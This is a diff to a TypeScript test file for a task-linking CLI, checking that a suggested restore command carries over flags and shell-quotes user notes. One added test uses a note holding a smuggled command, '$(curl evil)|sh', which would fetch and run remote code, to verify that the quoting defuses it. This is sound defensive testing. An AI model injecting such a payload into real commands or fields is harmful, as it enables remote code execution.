@@ -807,11 +807,44 @@ test("tasks relink names the restore command when the new link fails", async () 
         stdout: { write() {} },
         subcommand: "relink",
         positionalId: TASK_UUID,
-        options: { to: PEER_UUID, relation: "child" },
+        options: {
+          to: PEER_UUID,
+          relation: "child",
+          preprod: true,
+          "organization-slug": "pilot",
+        },
       }),
     new RegExp(
-      `Removed the parent link but could not create the child link: Core said no. Restore it with: sokosumi tasks link ${TASK_UUID} --relation parent --to ${PEER_UUID} --note "epic"`,
+      `Removed the parent link but could not create the child link: Core said no. Restore it with: sokosumi --preprod tasks link ${TASK_UUID} --relation 'parent' --to ${PEER_UUID} --organization-slug pilot --note 'epic'`,
     ),
+  );
+});
+
+test("tasks relink restore command shell-quotes notes and keeps --api-url", async () => {
+  const note = "see $(curl evil)|sh and it's fine";
+  await assert.rejects(
+    () =>
+      runTasksCommand({
+        client: linksClient([], [{ ...PARENT_LINK, note }], true),
+        stdout: { write() {} },
+        subcommand: "relink",
+        positionalId: TASK_UUID,
+        options: {
+          to: PEER_UUID,
+          relation: "child",
+          "api-url": "https://core.example.test",
+        },
+      }),
+    (error: unknown) => {
+      assert.ok(error instanceof Error);
+      assert.match(error.message, /--api-url 'https:\/\/core\.example\.test'/);
+      assert.match(
+        error.message,
+        /--note 'see \$\(curl evil\)\|sh and it'\\''s fine'/,
+      );
+      assert.doesNotMatch(error.message, /--note "/);
+      return true;
+    },
   );
 });
 
